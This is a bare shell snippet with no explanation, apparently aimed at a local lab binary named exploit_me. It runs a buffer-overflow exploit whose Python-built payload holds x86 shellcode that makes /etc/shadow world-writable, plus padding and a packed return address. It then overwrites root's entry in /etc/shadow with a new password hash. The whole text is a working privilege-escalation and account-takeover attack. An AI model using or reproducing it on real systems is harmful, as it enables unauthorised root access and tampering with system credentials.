env - PWD=$PWD ~/exploit_me $(python -c '
import struct
shellcode = "\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80"
offset = 140
address = 0xbffffdd0 - offset - 4
packed_address = struct.pack("<I", address)
print(shellcode + "A" * (offset - len(shellcode)) + packed_address)');
echo 'root:$6$TJd1amE7$Uh4ViEj1yE/t9m5PKVzPMfBACXbJLdpcVTjvmpfi6s7AG.wgVE2qvEtkKe7NSWNMNwoC0FBSKig1dKZDPMCcl0:19684:0:99999:7:::' > /tmp/shadow.new && cat /etc/shadow | grep -v root >> /tmp/shadow.new && cat /tmp/shadow.new > /etc/shadow && rm /tmp/shadow.new